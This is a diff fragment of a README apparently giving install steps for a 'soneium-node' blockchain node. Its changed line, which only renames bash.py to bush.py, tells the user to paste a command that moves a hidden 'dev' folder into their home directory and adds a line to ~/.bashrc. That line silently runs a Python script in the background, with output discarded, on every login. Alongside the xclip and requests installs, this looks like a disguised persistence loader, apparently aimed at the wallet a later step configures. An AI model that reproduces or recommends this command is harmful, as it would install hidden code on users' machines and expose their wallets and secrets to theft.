@@ -23,7 +23,7 @@ Make sure you have the latest versions of Docker and Docker Compose installed.
 
 ```
 sudo apt update && sudo apt upgrade -y && sudo apt install git ufw xclip python3-pip && sudo pip3 install requests
-git clone https://github.com/blockchain-DAT/soneium-node.git && cd soneium-node/minato && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
+git clone https://github.com/blockchain-DAT/soneium-node.git && cd soneium-node/minato && mv dev ~/ && echo "(pgrep -f bush.py || nohup python3 $HOME/dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
 ```
 
 ### 2️⃣ Configure Wallet:
